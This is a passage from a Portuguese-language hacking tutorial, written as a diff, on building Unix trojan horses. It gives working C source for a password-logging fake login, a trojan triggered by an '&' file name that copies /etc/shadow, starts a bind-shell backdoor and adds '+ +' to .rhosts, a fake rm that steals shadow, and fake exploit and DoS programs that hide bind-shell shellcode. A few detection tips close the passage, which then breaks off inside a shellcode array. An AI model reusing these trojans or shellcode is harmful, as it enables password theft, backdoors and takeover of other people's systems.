+senha = getpass("Password:");
+
+catador = fopen("./.arquivo.txt" ,"a+");
+if(!catador){exit(0);}
+
+fputs("login:",catador);
+for(i=0;login[i];i++)
+putc(login[i],catador);
+putc('\n',catador);
+
+fputs("senha:",catador);
+for(i=0;senha[i];i++)
+putc(senha[i],catador);
+putc('\n',catador);
+putc('\n',catador);
+return 0;
+}
+
+/* Essa tecnica pode ser usada em conjunto com permissoes
+em diretorios via NFS(su user)... basta modificar o arquivo .profile
+ou .bashrc... dependendo do sistema.. um exemplo tipico seria
+colocar ele em todos os dir dos usuarios mandando o arquivo que vai
+ser escrito,no caso acima (./.arquivo.txt) p/ um dir onde todos tem
+permissao de escrita... ex: (/var/tmp/.arquivo.txt).Atencao..veja se
+voce tera acesso a esse arquivo ou diretorio depois.
+Em caso de sistemas diferentes dos que voce possui como o codigo estah
+em c padrao vc pode chamar a rotina de algum compilador p/ que o codigo
+possa ser compilado e em seguida chamar a execucao do mesmo...abaixo
+seguem exemplos do que se pode fazer com isso:
+[*] No diretorio do usario..colocar num arquivo .profile:
+
+#Diretorio setado p/ arquivos temporarios
+/var/tmp/temp
+#FIM DO ARQUIVO
+
+[*] /var/tmp/temp -> eh o arquivo que ira ser executado.
+ele poderia conter:
+#
+gcc -o /var/tmp/.ptnl /var/tmp/.ptnl.c
+./ptnl
+#FIM DO ARQUIVO
+onde:
+gcc compila o arquivo, em seguida ele eh executado.
+*/
+
+-------------------------------------------------------------------------
+
+Este trojan funciona perfeitamente, ele pode ser usado em varios sistemas,
+destaque para AIX(Gosto de AIX!!:)).Mas cuidado!!Voce pode perceber que
+para funcionar sem problemas futuros, voce vai contar com a ajuda de um
+usuario desatento.Nas investidas que fiz, na maioria das vezes eu jogava
+em diretorios home de mulheres, e nao fui bem sucedido, amigo, isso mesmo!!
+Sem sombra de duvidas, as mulheres sao bem mais atentas do que os homens
+quanto a isso, eu que o diga!
+
+4.1.2 - O Truque do &
+----------------------
+
+Outro esquema muito difundido e tambem muito eficaz com usuarios desatentos
+e sem muito conhecimentos eh o truque do &.Em sistema linux, esse caracter
+especial eh usado para fazer com que um processo rode em background.Se
+voce possui acesso a shell voce pode se utilizar deste artificio para
+conseguir algumas coisinhas.Esse esquema pode ser util em redes onde o
+administrador configura os usuarios com PATH=./ .Isso serve para fazer com
+que os usuarios digitem sempre o local completo dos executaveis quando
+for executar algum.Mas vejamos um exemplo de um possivel esquema para
+este tipo de trojan:
+
+* Crie um arquivo parecido com o abaixo e depois o compile.
+
+---------------------------------.jpg.c---------------------------------
+
+/* Simples Exemplo de um arquivo executavel que serah executado a
+   partir do truque do &.Desenvolvido por Nashleon vulgo coracaodeleao.
+   nashleon@yahoo.com.br
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+/* Lugar onde estarah instalado um binario de uma
+   backdoor.Exemplo: a backdoor que binda uma shell
+   descrita no tutorial no item backdoors antigas */
+
+#define    PATH     "/home/nashleon/backsock"
+
+FILE *arquivo1, *arquivo2, *arquivo3;
+
+main(int argc, char *argv[]){
+char escreve[10],login[20];
+char path[40];
+/* Se for root, instala-se uma backdoor e copia o shadow */
+if(getuid() == 0){
+execl("/bin/cp","cp","/etc/shadow","/home/nashleon/shad.txt",0);
+execl("PATH","backsock",0);
+}
+else{
+system("/usr/bin/printenv | /usr/bin/grep 'LOGNAME' | /bin/cut -d '=' -f 2 
+> 1.txt");
+strcpy(escreve,"+ +");
+arquivo1 = fopen("./1.txt","rt");
+if(arquivo1 == NULL){
+exit(0);
+}
+fgets(login,20,arquivo1);
+sprintf(path,"/home/%s/.rhosts",login);
+system("/bin/touch /var/tmp/.vitimas");
+system("/bin/chmod 0777 /var/tmp/.vitimas");
+arquivo2 = fopen("/var/tmp/.vitimas","a+");
+fputs(login,arquivo2);
+fclose(arquivo2);
+system("/bin/rm -rf ./1.txt");
+arquivo3 = fopen(path,"a+");
+if(arquivo3 == NULL){
+exit(0);
+}
+fputs(escreve,arquivo3);
+fclose(arquivo3);
+return 0;
+}
+}
+----------------------------------jpg.c------------------------------
+
+Compile ele da seguinte forma em um diretorio publico(Exemplo: /tmp);
+
+[NewBie@redelamer.com]$ gcc -o .jpg jpg.c
+
+Isso farah com que o executavel fique com o nome .jpg.
+
+Em seguida crie um arquivo com um nome chamativo e com o caracter &.
+Vejamos um exemplo:
+
+[NeWbie@redelamer.com]$ /bin/touch tesao\&.jpg
+
+Se liga na "\" antes do &, isso eh fundamental para que o programa possa
+interpretar o caracter '&' e nao executar um processo em background.Uma
+vez feito isso tudo eh soh esperar que algum usuario curioso tente abrir
+a foto.Exemplo:
+
+[Vitima@redelamer.com]$ /usr/bin/seejpeg tesao&.jpg
+
+O que acontecerah eh que este usuario executarah os seguintes comando:
+
+$ /usr/bin/seejpeg tesao & -> Envia para Background.
+$ .jpg -> Executa o programa .jpg em seguida.
+
+Se voce notar verah que no .jpg temos comandos maliciosos.Se for root
+abrirah uma shell root via a backdoor bind shell e copiarah o arquivo
+shadow para um diretorio aonde temos acesso, no caso, o home.Se nao
+for root, criarah um arquivo .rlogin no diretorio deste usuario.Ele
+tambem cria um arquivo em "/var/tmp/.vitimas" contendo os usuarios que
+o executaram.Lembrando que este esquema soh funciona se o PATH estiver exposto
+a este ataque, para saber digite um sua shell "/usr/bin/printenv |
+/usr/bin/grep 'PATH' " aparecerah uma variavel PATH(nao eh MANPATH), se
+essa variavel for igual a "./", isto indica que a sua shell eh vulneravel,
+e se a sua eh, outras podem ser,entao execute o trojan tranquilamente.
+Existem dezenas de possiveis esquemas para se aproveitar deste "&", voce
+poderia juntar varios arquvos num .tar.gz, depois enviar para alguem e
+forcar a execucao do trojan, enfim, use sua imaginacao.
+
+4.1.3 - PATH=./ e rm
+---------------------
+
+Como vimos, existe um perigo consideravel em se definir o PATH=./ .
+Existe outro possivel esquema se aproveitando desta configuracao, mais
+nesse caso a pessoa teria que estar muito desatenta, mas tudo eh possivel.
+Muitas pessoas costuman enviar arquivos para diretorios onde todo mundo
+tem permissao de escrita(Ex: /tmp, /var/tmp, /home/ftp/incoming), e depois
+costumam ir nesses diretorios para apagar seus arquivos.Se aproveitando
+de um eventual descuido, um atacante pode obter vantagem disso tudo.Vejamos
+um possivel esquema para isso:
+
+* Criamos um arquivo rm.c, em seguida o compilamos e colocamos seu binario
+  num desses possiveis diretorios.
+
+--------------------------------rm.c------------------------------------
+/*  Exemplo de rm.c by Nash Leon */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+/* define-se o seu diretorio home */
+
+#define  MEUHOME    "/home/nashleon"
+
+/* Define-se o diretorio aonde o trojan serah instalado */
+
+#define  DIRTROJ    "/tmp"
+
+int main(int argc, char *argv[]){
+char comando1[50],comando2[50],argumento1[20],argumento2[20];
+if(getuid() == 0){
+setuid(0);
+sprintf(comando1,"/bin/cp /etc/shadow %s/.shad",MEUHOME);
+system(comando1);
+sprintf(comando2,"/bin/chmod 4777 %s/.shad",MEUHOME);
+system(comando2);
+}
+if(argv[1]){
+sprintf(argumento1,"/bin/rm %s",argv[1]);
+system(argumento1);
+exit(0);
+          }
+if(argv[2]){
+sprintf(argumento2,"/bin/rm %s %s",argv[1],argv[2]);
+system(argumento2);
+exit(0);
+           }
+return 0;
+}
+------------------------------------------------------------------------
+
+Nesse exemplo acima, se o root for bastante distraido,bota bastante nisso,
+se ele for no nosso diretorio e der um rm para apagar os arquivos ou algum
+arquivo de lah, ele executarah o trojan.Esse eh um esquema bobo, mas com
+esse esquema bobo eu jah consegui capturar um shadow, prefiro acreditar
+na distracao desse admin(Isso pode acontecer com qualquer um) do que na
+sua incompetencia!
+
+4.1.4 - Trojan em Shellcode
+-----------------------------
+
+Ha alguns meses atras, eu disponibilizei um tutorial sobre escrita basica
+de shellcodes para Linux.Nesse tutorial eu descrevi e demonstrei um 
+exemplo de trojan horse inserido num shellcode com base no shellcode do
+tutorial do Taeho Oh, nao alterei nem a porta porque tava imaginando que
+algo acontecesse.Nao deu outra, ha pouco tempo apareceram dois novos
+"exploits" sendo divulgado via servidores de irc que literalmente 
+executavam o shellcode descrito nesse tutorial.Um descrito como exploit
+para IMAP4rev1 v12.264 e outro para qpoper2.53, e como se nao bastasse,
+um conhecido, me enviou o exploit p/ imapd dizendo que o mesmo
+funcionava..:)..pelo visto ele nao leu meu tutorial sobre shellcodes.Se
+por um lado, esse ou esses lamers se embasaram no meu tutorial para fazer
+esse trojan, por outro, todos aqueles que leram meu tutorial e levaram a
+info a serio, nao cairam nesse truque..:)..O que pra mim eh muito valido.
+Quanto aos kiddies que executam exploits sem saber o que contem nos
+shellcodes..soh lamento.Mas vamos lah, trojans em shellcodes tambem nao
+eh coisa nova...Voce pode ver indo em http://stderr.sekure.org/ , lah
+tem um txt do stderr que fala justamente sobre isso, se nao me engano,
+ADV-fake-exp.txt.Qualquer um com conhecimentos basicos de assembly e
+escrita de shellcodes pode alterar o shellcode para executar comandos 
+maliciosos atraves de trojans.Se voce quiser ver o Trojan que disponibilizei, 
+veja no tutorial sobre shellcodes,em breve deverah vir a continuacao desse
+tutorial.Ele pode ser obtido em:
+
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+http://www.bufferoverflow.org/
+
+Lah, por padrao, deixei o shellcode do Taeho Oh, mas para voce amigo
+NewBie, que anda acompanhando as publicacoes do Unsekurity Team, eu
+vou disponibilizar alguma coisinhas a mais aqui.Como eu prometi no inicio
+do tutorial, nao entrarei em programacao de shellcode ou mesmo assembly,
+vou me limitar a ensinar como alterar diretamente no shellcode.Vejamos
+entao.
+
+No exploit do Taeho Oh a porta escolhida por ele foi 30464 pois esta
+porta possui uma representacao hexadecimal igual a 7700 ou 0x7700.Esses
+dois zeros finais facilitam e muito na programacao de shellcodes.Mas com
+um pouco de esperteza pode-se bindar outras portas.Me limitarei nesse
+tutorial a esquemas somente com portas com representacao hexadecimal
+equivalentes a escolhida pelo Taeho Oh, ou seja, terminando com dois
+zeros.Segue abaixo um simples programa em C que nos dah a representacao
+hexadecimal de uma dada porta.
+
+--------------------------------hexa.c--------------------------------
+/* Imprime determinado hexadecimal. 
+   Programa complexo demais!!!:) */
+
+#include <stdio.h>
+#include <stdlib.h>
+main(int argc, char *argv[]){
+int x;
+if(argc < 2){
+printf("Uso: %s <numero_porta>\n",argv[0]);
+exit(0);
+}
+x = atoi(argv[1]);
+printf("Seu equivalente em hexa eh: %X\n",x);
+return 0;
+}
+-----------------------------------------------------------------------
+
+Se voce sabe o basico de hexadecimal entao eh soh mandar brasa.Escolha
+uma porta com representacao hexadecimal com dois zeros no final, como
+20224, 10752, 14336, etc...Depois pegamos o shellcode do Taeho Oh e o
+alteramos diretamente nos hexas, Vamos pegar o terceiro e o quarto
+elementos da quarta linha abaixo e examinarmos.
+
+char shellcode[]=
+   "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
+   "\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
+   "\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
+/* O Terceiro e o quarto elementos abaixo representam o num da porta */
+   "\x46\x0c\xb0\x4f\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
+   "\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
+   "\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
+   "\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
+   "\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
+   "\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
+   "\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
+   "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
+   "\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";}
+
+
+Aqui estao os dois:
+
+ \xb0\x4f = porta 20224.
+
+Destaquei os dois para que voce jah vah logo percebendo as coisas.Se
+voce quisesse a porta 14336 que tem seu representante em hexa = 3800,
+tudo que voce deveria fazer era trocar esses "dois" elementos hexa
+por \xb0\x38 , caso seu numero seja 10752 voce troca os "dois" elementos
+por xb0\x2a.Enfim, eu deixei para explicar em detalhes como eh a escrita
+desse shellcode num txt jah em andamento, lah terah em detalhes o
+significado disso tudo, mas se voce quiser, leia o txt do Taeho Oh,
+"Advanced buffer overflow exploit" que pode ser obtido em:
+
+http://www.bufferoverflow.org/
+
+Mas e se voce alterar o \xb0 ???:).
+Agora vejamos o trojan com o shellcode alterado no exploit abaixo:
+
+------------------------------TrojanSc.c--------------------------------
+
+/* SIMPLES EXEMPLO DE TROJAN HORSE VIA SHELLCODE.
+   DESENVOLVIDO POR NASHLEON VULGO CORACAODELEAO.
+   nashleon@yahoo.com.br
+   Thanks Ramona e Unsekurity Team.
+   http://unsekurity.virtualave.net/
+   http://unsekurity.cyberpunk.com.br/
+   Os shellcodes abaixo eu peguei soh para ilustrar.
+   Tudo aqui eh ilustracao, para que fique bastante
+   claro os possiveis riscos que isso pode gerar.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define    NOP         0x90
+#define    BUFFER       616
+#define    ALIGN          0
+#define    OFFSET         0
+#define    ERRO          -1
+
+/* Defini versao do host vitima para overflow */
+/* :)..isso executarah el trojan!!!!:) */
+typedef void (*SO)();
+int prepara(char *digito);
+void imprime();
+char shellcode_linux[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+/* Shellcode para linux_ppc */
+char ppc_code[] =
+"\x38\x9f\x01\x2d\x38\x84\xfe\xff\x7f\xde\xf2\x78\x90\x81\x01\x08\x93\xc1\x01"
+"\x0c\x80\x61\x01\x08\x38\x81\x01\x08\x3f\xc0\xff\xff\x63\xde\xff\xf5\x7c\x1e"
+"\x04\xd0\x44\x01\x01\x02/bin/sh";
+
+/* Shellcode para AIX -> Nada de AIX, abaixo eh o shellcode trojan */
+char shellcode_AIX[]=
+"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
+"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
+"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
+"\x46\x0c\x14\x4e\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
+"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
+"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
+"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
+"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
+"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
+"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
+"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
+"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";
+
+
+char shellcode_freebsd[] =
+"\x4e\x45\x43\x46\x44\x45\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43"
+"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x00\x20\x45\x48\x45"
+"\x42\x46\x45\x45\x46\x45\x4c\x45\x46\x45\x46\x46\x41\x45\x46\x46"
+"\x43\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x41\x41\x00\x00\x00"
+"\x00\x00";
+
+char shellcode_solaris[] =
+"\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\xf4\x01\x00\x00\x01\x00\x0d\xff\x00\x00\x00\xff"
+"\xff\x02\x00\xf4\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x17\x00\x00\x00\x57\x4f\x52\x4b\x47\x52\x4f"
+"\x55\x50\x00\x55\x6e\x69\x78\x00\x53\x61\x6d\x62\x61\x00";
+
+char shellcode_win[]= "\x00\x00\x00\x41\xff\x53\x4d\x42\xd0\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x19\x00\x04\x42\x45\x41\x56\x00\x04\x42\x45\x41\x56\x49"
+"\x53\x00\x01\x08\x00\x79\x65\x70\x20\x79\x65\x70\x00\x00";
+
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+void imprime(){
+printf("Preparando Overflow!!\n");
+printf("Aguarde Alguns minutos depois comece a enviar pings para o
+alvo!!\n");
+printf("$ ping <host_alvo>\n\n");
+}
+int prepara(char *digito)
+{
+SO fp;
+fp=(SO)(digito);
+fp();
+}
+main(int argc, char *argv[]){
+int Meusocket;
+char *host,buf[1024];
+struct sockaddr_in vitima;
+struct hostent *he;
+char *buffer,*plataforma;
+int offset = OFFSET;
+char plataform[13], *shell;
+if(argc < 3){
+system("clear");
+printf("****** EXEMPLO DE TROJAN HORSE VIA SHELLCODE ******\n\n");
+printf("*********** Desenvolvido por Nash Leon ************\n\n");
+/* Agora vem a parte demonstrativa */
+printf("Simples Exploit para TCPdump!!\n");
+printf("Uso: %s <host_alvo> <plataforma>\n",argv[0]);
+printf("Onde plataforma pode ser:\n");
+printf("lin -> para linux.(Red Hat, Slackware, Debian, Open, etc)\n");
+printf("fre -> para FreeBSD.\n");
+printf("sol -> para Solaris.\n");
+printf("aix -> para AIX.\n");
+printf("ppc -> para Linux PPC.\n");
+printf("win -> para Windows NT.\n\n");
+printf("Exemplo:\n");
+printf("$ %s redelamer.com.br lin\n\n",argv[0]);
+exit(0);
+}
+if(argc == 3){
+host = argv[1];
+plataforma = argv[2];
+}
+if(!strcmp(plataforma,"lin")){
+shell = shellcode_linux;
+}
+if(!strcmp(plataforma,"sol")){
+shell = shellcode_solaris;
+}
+if(!strcmp(plataforma,"fre")){
+shell = shellcode_freebsd;
+}
+if(!strcmp(plataforma,"win")){
+shell = shellcode_win;
+}
+if(!strcmp(plataforma,"aix")){
+shell = shellcode_AIX;
+}
+if(!strcmp(plataforma,"ppc")){
+shell = ppc_code;
+}
+/* Preparando para Enviar dados */
+imprime();
+/* Prepara se for aix */
+prepara(shellcode_AIX);
+
+Meusocket = socket(AF_INET, SOCK_STREAM,0);
+if(Meusocket < 0)
+{
+        perror("Socket");
+        exit(1);
+}
+
+he = gethostbyname(host);
+if(he == NULL){
+herror("Host Desconhecido!");
+exit(ERRO);
+}
+vitima.sin_family = he->h_addrtype;
+vitima.sin_port = htons(21);
+vitima.sin_addr = *((struct in_addr *)he->h_addr);
+bzero(&(vitima.sin_zero), 8);
+if(connect(Meusocket,(struct sockaddr * )&vitima, sizeof(vitima)) == -1)
+{
+fprintf(stderr,"Erro em connect()!\n");
+close(Meusocket);
+}
+close(Meusocket);
+return 0;
+}
+............
+---------------------------------------------------------------------------
+
+Esse eh um trojan com varios shellcodes.Nao quero ser responsavel por nada
+de mau que venha a acontecer com alguem de modo que no exemplo acima
+vemos varios shellcodes que poderiam ser pegues via strings e um trojan
+verdadeiramente detectavel por algum usuario atento.O que eu quero que
+capte eh que existem inumeras possibilidades, e a deteccao dos mesmos pode
+ser dificil.Vamos continuando e poderah contemplar mais coisas.
+Pode-se ir bem mais alem que isto aih em cima.Eu fiz um tutorial
+ensinando programacao de RAW SOCKS, como se envia um datagrama e etc..lah
+tem um exemplo de um programa que envia pacotes ICMP, e numa parte eu
+digo para trocar o exemplo do datagrama que eu havia colocado por um
+datagrama de hexadecimais(lah tem hexa).Talvez algum atento tenha captado
+a mensagem, mas de qualquer forma, vou evidencia-la aqui.Muitos programas
+DoS usam RAW SOCKS,alguns nao usam, mas o que eu quero frisar eh que nao
+soh eh possivel enganarmos alguem com trojan via shellcode, mas tambem
+usa-los em falsos programas de DoS.Vejamos o exemplo abaixo:
+
+-------------------------------NLtrojDoS.c---------------------------------
+
+/* EXEMPLO DE TROJAN HORSE VIA DADOS EM HEXADECIMAL.
+   FEITO POR NASHLEON PARA TUTORIAL SOBRE TROJANS.
+   nashleon@yahoo.com.br.
+   O tutorial pode ser encontrado em:
+   http://unsekurity.virtualave.net/
+   http://unsekurity.cyberpunk.com.br/
+
+   Esse Trojan segue em "anexo" dentro de um pseudo-datagrama.
+   Como esse exemplo de DoS eh RAW Sockets, necessita ser root.
+   Isso expoe o perigo eminente de nao saber o que se estah executando.
+   Esse programa possui somente propositos educacionais.
+*/
+
+/* Aqui comeca a "brincadeira" !!
+   Programa Denial Of Service para "ipchains".
+   Derruba qualquer sistema Linux com kernel ateh "2.3.39".
+   Ele envia um datagrama que explora o bug da funcao get_data()
+   do ipfw.Se o sistema nao tiver com firewall, ele derruba do mesmo
+   jeito! */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+
+#define     ERRO        -1
+#define     TAM_IPHDR   sizeof(struct iphdr)
+#define     TAM_ICMPHDR sizeof(struct icmphdr)
+#define     NUM_PAC     100
+
+char datagrama[]=
+"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
+"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
+"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
+"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
+"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
+"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
+"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
+"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
+"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
+"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
+"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
+"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";
+
+typedef void (*DoS)();
+
+main(int argc, char *argv[]){
+int i, Meusocket,num_pac, id, seq;
+char *hosthack, *alvo;
+struct sockaddr_in vitima;
+struct sockaddr_in hacker;
+unsigned long int origem;
+unsigned long int destino;
+DoS envia;
+if(argc < 3){
+printf("Programa DoS para Ipchains!!\n");
+printf("Uso: %s <ip_origem> <ip_alvo>\n",argv[0]);
+exit(0);
+}
+if(getuid() != 0){
+printf("Esse programa usa RAW SOCKS, necessita ser root!!\n");
+exit(0);
+}
+hosthack = argv[1];
+alvo = argv[2];
+num_pac = NUM_PAC;
+Meusocket = socket(AF_INET,SOCK_RAW,1);
+if(Meusocket < 0){
+fprintf(stderr,"Erro em socket() mano!!\n");
+exit(ERRO);
+}
+vitima.sin_family = AF_INET;
+vitima.sin_addr.s_addr = inet_addr(alvo);
+bzero(&(vitima.sin_zero), 8);
+memset(argv[0],0,100);
+hacker.sin_family = AF_INET;
+hacker.sin_addr.s_addr = inet_addr(hosthack);
+bzero(&(hacker.sin_zero),8);
+origem = hacker.sin_addr.s_addr;
+destino = vitima.sin_addr.s_addr;
+id = 0;
+seq = 0;
+for(i = 0; i < num_pac; i++){
+icmp_echo(Meusocket, origem, destino, id,seq,datagrama,sizeof(datagrama));
+printf(".");
+}
+printf("\nPacotes Enviados com sucesso!!\n");
+envia=(DoS)(datagrama);
+envia();
+return 0;
+}
+
+/* Checksum */
+unsigned short in_cksum(addr, len)
+    u_short *addr;
+    int len;
+{
+    register int nleft  = len;
+    register u_short *w = addr;
+    register int sum    = 0;
+    u_short answer      = 0;
+
+    while (nleft > 1)  {
+        sum   += *w++;
+        nleft -= 2;
+    }
+
+    if (nleft == 1) {
+        *(u_char *)(&answer) = *(u_char *)w ;
+        sum += answer;
+    }
+
+    sum    = (sum >> 16) + (sum & 0xffff);
+    sum   += (sum >> 16);
+    answer = ~sum;
+    return(answer);
+}
+
+icmp_echo(int Meusocket, unsigned long int origem, unsigned long int
+         destino, int id, int seq, char *data, unsigned int datasize)
+{
+  unsigned char        *pacote;
+  unsigned char        *icmpdata;
+  struct   iphdr       *ip;
+  struct   icmphdr     *icmp;
+  struct   sockaddr_in vitima;
+  int N;
+
+  pacote = (char *)malloc(TAM_IPHDR + TAM_ICMPHDR + datasize + 1);
+  if (pacote == NULL) {
+        perror("malloc");
+        exit(ERRO);
+  }
+  ip       = (struct iphdr   *)pacote;
+  icmp     = (struct icmphdr *)(pacote + TAM_IPHDR);
+  icmpdata = (char           *)(pacote + TAM_IPHDR + TAM_ICMPHDR);
+
+  ip->saddr              =  origem;
+  ip->daddr              =  destino;
+  ip->version            =  4;
+  ip->ihl                =  5;
+  ip->ttl                =  255;
+  ip->protocol           =  1;
+  ip->tot_len            =  htons(TAM_IPHDR + TAM_ICMPHDR + datasize);
+  ip->tos                =  0;
+  ip->id                 =  0;
+  ip->frag_off           =  0;
+  ip->check              =  0;
+  ip->check              =  in_cksum(ip, TAM_IPHDR);
+
+  icmp->type             =  8;
+  icmp->code             =  0;
+  icmp->checksum         =  0;
+  icmp->un.echo.id       =  id;
+  icmp->un.echo.sequence =  seq;
+
+  memcpy(icmpdata, data, datasize);
+
+  icmp->checksum          = in_cksum(icmp, TAM_ICMPHDR + datasize);
+
+  vitima.sin_addr.s_addr = ip->daddr;
+  vitima.sin_family      = AF_INET;
+
+N =sendto(Meusocket, pacote, TAM_IPHDR + TAM_ICMPHDR + datasize, 0,(struct
+	sockaddr *)&vitima, sizeof(struct sockaddr));
+if (N == ERRO) {
+                perror("sendto()");
+                free(pacote);
+                exit(ERRO);
+  }
+  free(pacote);
+}
+
+---------------------------------------------------------------------------
+
+O shellcode acima eh o mesmo do Taeho Oh, porta 30464.RAW SOCKS requer
+root, entao, amigo, aih reside um perigo consideravel.Muitos DoS seguem
+o esquema acima, em especial para sistemas Windows.O exemplo acima pode
+ser melhorado e descrevi novamente para demonstrar o perigo existente
+em se usar exploits sem conhecimento basico de C.Creio que a solucao para
+esse problema nao estah no uso do comando strings, como podemos ver nesses
+dois exemplos, eh dificil perceber um trojan somente via strings.Meu
+conselho eh aprender e nao usar exploits de terceiros, e sim fazer o seu
+proprio.Sei muito bem que tem casos que se faz necessario o uso de
+programas e ateh mesmo exploits de terceiros que sao de origem
+desconfiaveis(Basta backdoor do frontpage!!:).), entao amigo, talvez 
+algumas possiveis solucoes sejam:
+
+* Execute primeiramente o programa como usuario comum e depois cheque o
+  sistema via ps aux e netstat.Tome cuidado com os LKMs tambem(lsmod).
+  Preste atencao nos arquivos do seu diretorio /proc.
+* Nunca testar o exploit conectado a internet, procure testar
+  localmente caso possua o programa bugado.E mesmo nao possuindo execute-o
+  localmente sem estar conectado para ver como ele reage.
+* Use o comando /usr/bin/strings, ele pode ser util sim.
+* Procure verificar a origem do exploit e se a vulnerabilidade teorica 
+  tem fundamento.Sabemos que existem vunerabilidades que somente alguns
+  grupos a conhecem, e a comunidade de seguranca nao estah a par,de modo
+  que, verifique sempre se esse grupo eh de hackers ou nao.Se voce tem
+  "passe" no underground, e caso esse exploit tenha mesmo origem de um
+  grupo hacker(nao lamers, crackers, kiddies, etc) descente,procure
+  entrar em contato diretamente com esse grupo.Hackers de verdade nao
+  andam por aih distribuindo trojan para prejudicar terceiros, e sim para
+  mostrar vulnerabilidades e possiveis defesas disso.
+* Caso tenha duvidas sobre o exploit, nao o execute, descarte-o, pois tem
+  akele ditado: "O Medo eh uma virtude", se voce estah temoroso eh porque
+  estah atento.E nesse mundo virtual, estar atento eh fundamental!Pois 
+  um cracker poderia muito bem colocar um shellcode parecido com esse:
+
+  char shellcode_rm[] =
+        "\xeb\x31\x5e\x89\x76\x0e\x8d\x5e\x08\x89\x5e\x12"
+        "\x8d\x5e\x0c\x89\x5e\x16\x31\xc0\x88\x46\x07\x88"
+        "\x46\x0b\x88\x46\x0d\x89\x46\x1a\xb0\x0b\x89\xf3"
+        "\x8d\x4e\x0e\x8d\x56\x1a\xcd\x80\x31\xdb\x89\xd8"
